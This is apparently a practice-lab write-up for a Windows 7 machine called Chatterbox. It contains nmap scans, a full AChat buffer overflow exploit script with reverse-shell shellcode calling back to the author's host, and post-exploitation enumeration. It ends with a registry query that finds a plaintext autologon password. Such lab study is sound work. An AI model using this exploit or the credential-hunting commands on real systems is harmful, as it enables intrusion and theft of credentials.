# Chatterbox

## Basic Informatin

IP Address: 10.10.10.74

## nmap Results

```
steven@McK-XPS:~$ nmap 10.10.10.74
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 18:16 EST
Nmap scan report for 10.10.10.74
Host is up (0.056s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown


steven@McK-XPS:~$ sudo nmap -T4 -A -p- 10.10.10.74
[sudo] password for steven: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 18:18 EST
Nmap scan report for 10.10.10.74
Host is up (0.054s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  tcpwrapped
9256/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/24%OT=135%CT=1%CU=38111%PV=Y%DS=2%DC=T%G=Y%TM=67
OS:43B4DC%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=
OS:S%TS=7)SEQ(SP=104%GCD=2%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M53CNW8S
OS:T11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53C
OS:ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=
OS:80%W=2000%O=M53CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%
OS:F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL
OS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h40m00s, deviation: 2h53m14s, median: 4h59m59s
| smb2-time: 
|   date: 2024-11-25T04:20:52
|_  start_date: 2024-11-25T04:11:10
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-24T23:20:50-05:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   54.47 ms 10.10.14.1
2   54.67 ms 10.10.10.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.69 seconds
steven@McK-XPS:~$ sudo nmap -sV -p- 10.10.10.74
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 18:23 EST
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 96.66% done; ETC: 18:24 (0:00:03 remaining)
Nmap scan report for 10.10.10.74
Host is up (0.057s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.24 seconds
```
The Achat service has a vulnerability.
Python buffer overflow: https://www.exploit-db.com/exploits/36025

## Achat Exploit

```python
#!/usr/bin/python

# Author KAhara MAnhara

# Achat 0.150 beta7 - Buffer Overflow

# Tested on Windows 7 32bit

  

import socket

import sys, time

  

# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=5235 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

#Payload size: 512 bytes

  

buf = b""

buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"

buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"

buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"

buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"

buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"

buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"

buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"

buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"

buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"

buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"

buf += b"\x75\x34\x4a\x42\x69\x6c\x57\x78\x32\x62\x79\x70"

buf += b"\x6b\x50\x4b\x50\x43\x30\x34\x49\x59\x55\x4e\x51"

buf += b"\x37\x50\x61\x54\x34\x4b\x50\x50\x4e\x50\x44\x4b"

buf += b"\x50\x52\x7a\x6c\x74\x4b\x30\x52\x5a\x74\x44\x4b"

buf += b"\x51\x62\x4e\x48\x6a\x6f\x58\x37\x30\x4a\x6d\x56"

buf += b"\x30\x31\x69\x6f\x66\x4c\x4d\x6c\x63\x31\x61\x6c"

buf += b"\x5a\x62\x6e\x4c\x4d\x50\x35\x71\x58\x4f\x6a\x6d"

buf += b"\x4d\x31\x77\x57\x6b\x32\x6a\x52\x32\x32\x61\x47"

buf += b"\x74\x4b\x31\x42\x4a\x70\x62\x6b\x4f\x5a\x4f\x4c"

buf += b"\x54\x4b\x30\x4c\x6b\x61\x32\x58\x57\x73\x4f\x58"

buf += b"\x4b\x51\x77\x61\x62\x31\x32\x6b\x32\x39\x6d\x50"

buf += b"\x4d\x31\x49\x43\x54\x4b\x30\x49\x5a\x78\x67\x73"

buf += b"\x6c\x7a\x4d\x79\x32\x6b\x6f\x44\x42\x6b\x39\x71"

buf += b"\x5a\x36\x70\x31\x69\x6f\x64\x6c\x49\x31\x38\x4f"

buf += b"\x5a\x6d\x49\x71\x78\x47\x4f\x48\x49\x50\x33\x45"

buf += b"\x58\x76\x6b\x53\x61\x6d\x59\x68\x6f\x4b\x43\x4d"

buf += b"\x6e\x44\x44\x35\x48\x64\x71\x48\x74\x4b\x31\x48"

buf += b"\x6d\x54\x7a\x61\x68\x53\x61\x56\x62\x6b\x4c\x4c"

buf += b"\x30\x4b\x72\x6b\x70\x58\x4b\x6c\x7a\x61\x76\x73"

buf += b"\x32\x6b\x7a\x64\x62\x6b\x7a\x61\x7a\x30\x43\x59"

buf += b"\x70\x44\x6e\x44\x4b\x74\x61\x4b\x6f\x6b\x53\x31"

buf += b"\x50\x59\x71\x4a\x52\x31\x69\x6f\x6b\x30\x6f\x6f"

buf += b"\x51\x4f\x6e\x7a\x42\x6b\x6a\x72\x58\x6b\x74\x4d"

buf += b"\x31\x4d\x70\x68\x4d\x63\x4c\x72\x6d\x30\x69\x70"

buf += b"\x53\x38\x53\x47\x54\x33\x6c\x72\x31\x4f\x31\x44"

buf += b"\x62\x48\x70\x4c\x72\x57\x6e\x46\x5a\x67\x4b\x4f"

buf += b"\x6a\x35\x37\x48\x36\x30\x4a\x61\x6d\x30\x39\x70"

buf += b"\x4c\x69\x56\x64\x32\x34\x32\x30\x42\x48\x4f\x39"

buf += b"\x61\x70\x62\x4b\x59\x70\x39\x6f\x78\x55\x32\x30"

buf += b"\x70\x50\x32\x30\x6e\x70\x4f\x50\x42\x30\x31\x30"

buf += b"\x42\x30\x33\x38\x77\x7a\x7a\x6f\x49\x4f\x77\x70"

buf += b"\x69\x6f\x36\x75\x56\x37\x6f\x7a\x69\x75\x72\x48"

buf += b"\x5a\x6a\x6b\x5a\x6a\x6e\x69\x77\x33\x38\x49\x72"

buf += b"\x49\x70\x6a\x74\x72\x53\x73\x59\x48\x66\x50\x6a"

buf += b"\x5a\x70\x51\x46\x72\x37\x53\x38\x45\x49\x66\x45"

buf += b"\x72\x54\x53\x31\x6b\x4f\x5a\x35\x55\x35\x59\x30"

buf += b"\x34\x34\x4a\x6c\x4b\x4f\x4e\x6e\x4d\x38\x52\x55"

buf += b"\x4a\x4c\x53\x38\x48\x70\x56\x55\x44\x62\x52\x36"

buf += b"\x69\x6f\x4a\x35\x73\x38\x30\x63\x62\x4d\x32\x44"

buf += b"\x79\x70\x64\x49\x4a\x43\x62\x37\x70\x57\x31\x47"

buf += b"\x4e\x51\x48\x76\x51\x5a\x4e\x32\x51\x49\x62\x36"

buf += b"\x37\x72\x79\x6d\x6f\x76\x65\x77\x6f\x54\x6e\x44"

buf += b"\x4d\x6c\x6b\x51\x7a\x61\x54\x4d\x6e\x64\x4e\x44"

buf += b"\x5a\x70\x65\x76\x39\x70\x4f\x54\x72\x34\x52\x30"

buf += b"\x6e\x76\x42\x36\x31\x46\x70\x46\x72\x36\x70\x4e"

buf += b"\x4f\x66\x61\x46\x6f\x63\x6e\x76\x62\x48\x70\x79"

buf += b"\x38\x4c\x4d\x6f\x72\x66\x69\x6f\x79\x45\x43\x59"

buf += b"\x57\x70\x70\x4e\x6f\x66\x31\x36\x59\x6f\x6c\x70"

buf += b"\x70\x68\x4d\x38\x73\x57\x4b\x6d\x63\x30\x6b\x4f"

buf += b"\x7a\x35\x57\x4b\x48\x70\x57\x45\x77\x32\x70\x56"

buf += b"\x71\x58\x53\x76\x42\x75\x75\x6d\x45\x4d\x39\x6f"

buf += b"\x47\x65\x6d\x6c\x4d\x36\x33\x4c\x7a\x6a\x43\x50"

buf += b"\x59\x6b\x57\x70\x63\x45\x4a\x65\x67\x4b\x6e\x67"

buf += b"\x6d\x43\x32\x52\x30\x6f\x42\x4a\x4d\x30\x4e\x73"

buf += b"\x39\x6f\x56\x75\x41\x41"

  
  
  

# Create a UDP socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

server_address = ('10.10.10.74', 9256)

  

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"

p = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"

p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)

p += "\x62" + "A"*45

p += "\x61\x40"

p += "\x2A\x46"

p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"

p += "\x61\x43" + "\x2A\x46"

p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)

p += buf + b"A" * (1152 - len(buf))

p += "\x00" + "A"*10 + "\x00"

  

print("---->{P00F}!")

i=0

while i<len(p):

if i > 172000:

time.sleep(1.0)

sent = sock.sendto(p[i:(i+8192)], server_address)

i += sent

sock.close()
```

Opened 2 terminal windows. In the first I ran `nc -lvp 5235`. In the other I ran the Achat.py script to get a shell.

![[Pasted image 20241124183024.png]]

```
C:\Windows\system32>whoami
whoami
chatterbox\alfred

C:\Windows\system32>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192  Mandatory group, Enabled by default, Enabled group

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Windows\system32>net user
net user

User accounts for \\CHATTERBOX

-------------------------------------------------------------------------------
Administrator            Alfred                   Guest                    
The command completed successfully.


C:\Windows\system32>net localgroups 
net localgroups
The syntax of this command is:

NET
    [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP |
      HELPMSG | LOCALGROUP | PAUSE | SESSION | SHARE | START |
      STATISTICS | STOP | TIME | USE | USER | VIEW ]

C:\Windows\system32>net user Alfred
net user Alfred
User name                    Alfred
Full Name                    
Comment                      
User's comment               
Country code                 001 (United States)
Account active               Yes
Account expires              Never

Password last set            12/10/2017 9:18:08 AM
Password expires             Never
Password changeable          12/10/2017 9:18:08 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   11/24/2024 11:11:09 PM

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.

C:\Windows\system32>ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Chatterbox
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #2
   Physical Address. . . . . . . . . : 00-50-56-B0-03-56
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.74(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{111D2FF5-EF2C-4D77-B44C-DBCE3AAABF4B}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

:\Windows\system32>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       352
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       716
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       448
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       276
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       456
  TCP    10.10.10.74:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.74:9255       0.0.0.0:0              LISTENING       3988
  TCP    10.10.10.74:9256       0.0.0.0:0              LISTENING       3988
  TCP    10.10.10.74:49158      10.10.14.7:5235        ESTABLISHED     3988
  TCP    [::]:135               [::]:0                 LISTENING       664
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       352
  TCP    [::]:49153             [::]:0                 LISTENING       716
  TCP    [::]:49154             [::]:0                 LISTENING       904
  TCP    [::]:49155             [::]:0                 LISTENING       448
  TCP    [::]:49156             [::]:0                 LISTENING       276
  TCP    [::]:49157             [::]:0                 LISTENING       456
  UDP    0.0.0.0:123            *:*                                    872
  UDP    0.0.0.0:500            *:*                                    904
  UDP    0.0.0.0:4500           *:*                                    904
  UDP    0.0.0.0:5355           *:*                                    1104
  UDP    0.0.0.0:57478          *:*                                    1104
  UDP    10.10.10.74:137        *:*                                    4
  UDP    10.10.10.74:138        *:*                                    4
  UDP    10.10.10.74:1900       *:*                                    3092
  UDP    10.10.10.74:9256       *:*                                    3988
  UDP    10.10.10.74:58526      *:*                                    3092
  UDP    127.0.0.1:1900         *:*                                    3092
  UDP    127.0.0.1:58527        *:*                                    3092
  UDP    [::]:123               *:*                                    872
  UDP    [::]:500               *:*                                    904
  UDP    [::]:4500              *:*                                    904
  UDP    [::1]:1900             *:*                                    3092
  UDP    [::1]:58525            *:*                                    3092


C:\Windows\system32>route print
route print
===========================================================================
Interface List
 13...00 50 56 b0 03 56 ......Intel(R) PRO/1000 MT Network Connection #2
  1...........................Software Loopback Interface 1
 12...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.10.10.2      10.10.10.74    266
       10.10.10.0    255.255.255.0         On-link       10.10.10.74    266
      10.10.10.74  255.255.255.255         On-link       10.10.10.74    266
     10.10.10.255  255.255.255.255         On-link       10.10.10.74    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link       10.10.10.74    266
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
  255.255.255.255  255.255.255.255         On-link       10.10.10.74    266
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       10.10.10.2  Default 
          0.0.0.0          0.0.0.0       10.10.10.2  Default 
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    306 ::1/128                  On-link
  1    306 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

```

## Password Enumeration

I ran 
reg query HKLM /f password /t REG_SZ /s
or
reg query HKCU /f password /t REG_SZ /s

Got the following results:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Welcome1!

```

Queried the registration:
```
C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked

```